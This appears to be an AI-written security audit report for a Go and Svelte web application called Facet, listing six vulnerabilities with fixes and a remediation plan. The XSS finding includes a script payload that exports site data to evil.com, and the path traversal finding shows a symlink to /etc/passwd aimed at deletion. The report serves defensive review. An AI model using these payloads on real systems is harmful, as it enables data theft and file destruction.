# Security Audit Report

**Date:** January 3, 2026
**Auditor:** Claude (AI Security Review)
**Scope:** Full codebase (Backend Go + Frontend TypeScript/Svelte)
**Purpose:** Defensive security - Identify vulnerabilities for remediation

---

## Executive Summary

The Facet codebase demonstrates **solid security fundamentals** with proper authentication, encryption, and access control mechanisms in place. However, several **MEDIUM and HIGH severity issues** were identified that require attention.

**Overall Security Posture:** ✅ **Good** (with critical fixes needed)

**Issues Found:**
- 1 HIGH severity: Unencrypted API key exposure risk
- 3 MEDIUM severity: Path traversal, XSS in markdown, debug logging
- 2 LOW severity: Missing HTTPS enforcement, disabled security headers

---

## Critical Findings

### 🔴 HIGH SEVERITY

#### 1. API Key Encryption - Historical Vulnerability
**File:** `backend/migrations/1735600008_fix_api_key_hidden.go`
**Risk:** Old API keys may be unencrypted in existing databases

**Issue:**
Migration comment indicates past vulnerability where API keys were visible. Current code encrypts keys using AES-256-GCM, but existing databases may contain unencrypted keys.

**Evidence:**
```go
// Migration name: "fix_api_key_hidden" suggests keys were previously exposed
// Current code DOES encrypt:
encryptedKey, err := crypto.Encrypt(apiKey)
record.Set("api_key", encryptedKey)
```

**Recommendation:**
```
Create migration to:
1. Find all ai_providers records with unencrypted api_key
2. Re-encrypt them using current crypto.Encrypt()
3. Add is_key_encrypted flag for audit trail
4. Force key rotation on next login
```

**Impact:** Exposure of OpenAI/Anthropic API keys → Unauthorized API usage, billing fraud
**Likelihood:** Medium (only affects databases created before encryption was added)

---

### 🟡 MEDIUM SEVERITY

#### 2. Path Traversal - Media Deletion
**File:** `backend/hooks/media.go` (lines 502-516)
**Function:** `resolveStoragePath()`

**Issue:**
Symlink attacks possible on Unix systems could allow deletion of files outside storage directory.

**Vulnerable Code:**
```go
func resolveStoragePath(storageRoot, rel string) (string, error) {
    clean := filepath.Clean(rel)
    if strings.Contains(clean, "..") {
        return "", os.ErrInvalid
    }
    // ... trimming
    target := filepath.Join(storageRoot, clean)
    if !strings.HasPrefix(target, storageRoot) {
        return "", os.ErrInvalid
    }
    return target, nil  // ⚠️ Doesn't check for symlinks
}
```

**Attack Scenario:**
```bash
# Attacker with write access creates symlink:
ln -s /etc/passwd storage/uploads/malicious_link

# Then calls DELETE /api/media with path: "uploads/malicious_link"
# Could delete /etc/passwd if permissions allow
```

**Fix:**
```go
func resolveStoragePath(storageRoot, rel string) (string, error) {
    // ... existing cleanup ...

    // Add symlink check
    info, err := os.Lstat(target)
    if err == nil && (info.Mode() & os.ModeSymlink) != 0 {
        return "", errors.New("symlinks not allowed")
    }

    // Use absolute path comparison
    absRoot, _ := filepath.Abs(storageRoot)
    absTarget, _ := filepath.Abs(target)
    if !strings.HasPrefix(absTarget, absRoot) {
        return "", os.ErrInvalid
    }

    return absTarget, nil
}
```

**Impact:** Arbitrary file deletion
**Likelihood:** Low (requires auth + specific file system setup)

---

#### 3. XSS - Markdown Rendering Not Sanitized
**File:** `frontend/src/lib/utils.ts` (lines 22-90)
**Function:** `parseMarkdown()`

**Issue:**
Markdown content rendered without sanitization. DOMPurify is installed but not used.

**Vulnerable Code:**
```typescript
export function parseMarkdown(content: string): string {
    if (!content) return '';
    const withEmbeds = applyShortcodes(content);
    const html = marked.parse(withEmbeds, { async: false }) as string;
    return html;  // ⚠️ Unsan it ized HTML returned
}
```

**Attack:**
```markdown
Admin creates post with:
"Hello **world** <script>fetch('/api/export').then(r=>r.text()).then(data=>fetch('https://evil.com',{method:'POST',body:data}))</script>"

Frontend renders → script executes → exports all data to attacker
```

**Fix:**
```typescript
import DOMPurify from 'dompurify';
import { marked } from 'marked';

export function parseMarkdown(content: string): string {
    if (!content) return '';
    const withEmbeds = applyShortcodes(content);
    const html = marked.parse(withEmbeds, { async: false }) as string;

    // Sanitize before returning
    return DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3',
                       'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'blockquote',
                       'a', 'img', 'figure', 'iframe', 'div', 'video'],
        ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'id',
                       'target', 'rel', 'allowfullscreen', 'controls']
    });
}
```

**Impact:** Stored XSS → Session hijacking, data exfiltration
**Likelihood:** Low (only admins can create content, but still a risk)

---

#### 4. Debug Logging in Production
**File:** `backend/hooks/view.go` (lines 557-790)

**Issue:**
Extensive `fmt.Println()` debug statements expose sensitive data in production logs.

**Examples:**
```go
fmt.Printf("[API /api/homepage] Profile: id=%s name=%q visibility=%q\n",
    profile.Id, profile.GetString("name"), profile.GetString("visibility"))
```

**Risk:** Logs may contain:
- Record IDs
- Visibility settings
- Query results
- User data

**Fix:**
```go
// Replace with proper logging:
app.Logger().Debug("homepage request", "profile_id", profile.Id)

// Or remove entirely for production
```

**Impact:** Information disclosure via logs
**Likelihood:** High (logs are commonly monitored/stored)

---

### 🟢 LOW SEVERITY

#### 5. HTTPS Not Enforced
**File:** `backend/hooks/security.go` (lines 36-38)

**Issue:** Only warns about missing HTTPS, doesn't enforce it.

**Current:**
```go
if !usesHTTPS {
    log.Println("⚠️  [SECURITY WARNING] Running without HTTPS")
    // WARNING ONLY - REQUESTS STILL ACCEPTED
}
```

**Fix:** Configure reverse proxy (Caddy) to enforce HTTPS, or add redirect.

---

#### 6. Security Headers Disabled
**File:** `backend/main.go` (line 61)

**Issue:**
```go
// hooks.RegisterSecurityHeaders(app)  // COMMENTED OUT
```

Missing headers:
- Content-Security-Policy
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security

**Fix:** Re-enable after implementing middleware correctly.

---

## Security Strengths ✅

### Authentication & Authorization
- ✅ Email allowlist for admin access
- ✅ OAuth2 and password auth properly validated
- ✅ All collections require authentication for direct API access
- ✅ Public data served through controlled endpoints
- ✅ View visibility (public/unlisted/password/private) enforced

### Cryptography
- ✅ AES-256-GCM encryption for API keys/tokens
- ✅ bcrypt (cost 12) for passwords
- ✅ HMAC-SHA256 for share token storage
- ✅ JWT with proper signatures and expiration
- ✅ Constant-time comparisons prevent timing attacks

### Rate Limiting
- ✅ Three-tier system (strict/moderate/normal)
- ✅ Password checking: 5 req/min (prevents brute force)
- ✅ Token validation: 10 req/min
- ✅ Public endpoints: 60 req/min
- ✅ RFC 6585 compliant headers

### Input Validation
- ✅ Parameterized queries (no SQL injection)
- ✅ File upload size limits (20MB)
- ✅ URL sanitization in shortcodes
- ✅ PocketBase ORM handles escaping

### Dependencies
- ✅ golang.org/x/crypto v0.29.0 (current)
- ✅ PocketBase v0.23.4 (recent)
- ✅ DOMPurify v3.0.0 available
- ✅ No deprecated packages detected

---

## Remediation Roadmap

### Phase 1: Immediate (1-2 days)
**Priority: HIGH**

1. **Fix XSS vulnerability**
   - File: `frontend/src/lib/utils.ts`
   - Action: Implement DOMPurify sanitization
   - Effort: 1 hour
   - Test: Verify markdown rendering with XSS payloads

2. **Remove debug logging**
   - File: `backend/hooks/view.go`
   - Action: Replace `fmt.Println()` with `app.Logger()` or remove
   - Effort: 2 hours
   - Test: Check logs don't expose sensitive data

3. **Re-enable security headers**
   - File: `backend/main.go`, `backend/hooks/security.go`
   - Action: Fix middleware implementation, uncomment
   - Effort: 3 hours
   - Test: Verify headers present in HTTP responses

### Phase 2: Short-term (1 week)
**Priority: MEDIUM**

4. **Fix path traversal**
   - File: `backend/hooks/media.go`
   - Action: Add symlink checks, absolute path validation
   - Effort: 4 hours
   - Test: Attempt symlink attacks, verify blocked

5. **Audit API key encryption**
   - File: New migration
   - Action: Check/re-encrypt old keys
   - Effort: 3 hours
   - Test: Verify all stored keys are encrypted

6. **Enforce HTTPS**
   - File: `docker/Caddyfile` or `backend/hooks/security.go`
   - Action: Add HTTP→HTTPS redirect
   - Effort: 1 hour
   - Test: Verify HTTP requests redirect

### Phase 3: Long-term (Ongoing)
**Priority: LOW**

7. **Dependency scanning**
   - Action: Set up GitHub Dependabot or Snyk
   - Effort: 2 hours
   - Frequency: Weekly automated scans

8. **Security headers audit**
   - Action: Review all response headers, add CSP
   - Effort: 4 hours
   - Test: Use securityheaders.com

9. **Penetration testing**
   - Action: Professional security assessment
   - Effort: External consultant
   - Frequency: Annually

---

## Testing Checklist

Before deploying security fixes:

- [ ] XSS: Test markdown with `<script>`, `<img onerror>`, `javascript:` URIs
- [ ] Path traversal: Test symlink attacks, `../` paths, absolute paths
- [ ] Auth: Test unauthorized access to admin endpoints
- [ ] Rate limiting: Test brute force on password/token endpoints
- [ ] HTTPS: Test HTTP→HTTPS redirect, HSTS headers
- [ ] Headers: Verify all security headers present
- [ ] Encryption: Verify API keys encrypted at rest
- [ ] Logs: Verify no sensitive data in production logs

---

## Files Audited

**Backend (24 files):**
- `backend/main.go`
- `backend/go.mod`
- `backend/hooks/*.go` (13 files)
- `backend/services/*.go` (8 files)
- `backend/migrations/*.go` (sample reviewed)

**Frontend (2 files):**
- `frontend/package.json`
- `frontend/src/lib/utils.ts`

---

## Audit Methodology

1. **Static Analysis:** Code review of authentication, encryption, input handling
2. **Dependency Review:** Checked go.mod and package.json for known vulnerabilities
3. **Threat Modeling:** Identified attack vectors (XSS, injection, path traversal)
4. **Best Practices:** Compared against OWASP Top 10, CWE guidelines

**Tools Used:**
- Manual code review
- Pattern matching for common vulnerabilities
- Dependency version checking

**Limitations:**
- No dynamic testing (penetration testing)
- No source code scanning tools
- Focus on common web vulnerabilities

---

## References

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Go Security Best Practices](https://github.com/Checkmarx/Go-SCP)
- [PocketBase Security](https://pocketbase.io/docs/security/)

---

## Revision History

| Date | Version | Changes |
|------|---------|---------|
| 2026-01-03 | 1.0 | Initial security audit |

---

**Next Audit Due:** 2026-04-03 (3 months)
